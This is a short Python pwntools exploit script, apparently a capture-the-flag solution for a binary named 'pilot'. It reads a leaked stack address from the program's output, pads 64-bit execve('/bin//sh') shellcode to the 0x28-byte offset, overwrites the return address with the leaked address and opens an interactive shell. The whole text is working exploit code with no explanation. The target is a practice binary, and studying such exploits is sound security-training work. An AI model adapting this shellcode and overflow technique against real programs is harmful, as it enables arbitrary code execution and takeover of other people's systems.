from pwn import *
import re

context.terminal = ["tmux", "splitw", "-h"]

bin_name = './pilot'

elf = ELF(bin_name)
target = process(bin_name)
# target = gdb.debug(bin_name, '''
# start
# c
# ''')

pattern = r'0x[0-9a-fA-F]+'
location = re.search(pattern, target.recvuntil(b"[*]Command:").decode()).group()
location = int(location, 16)

shellcode64 = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

payload = shellcode64 + b"a"*(0x28-len(shellcode64)) + p64(location)

target.sendline(payload)

target.interactive()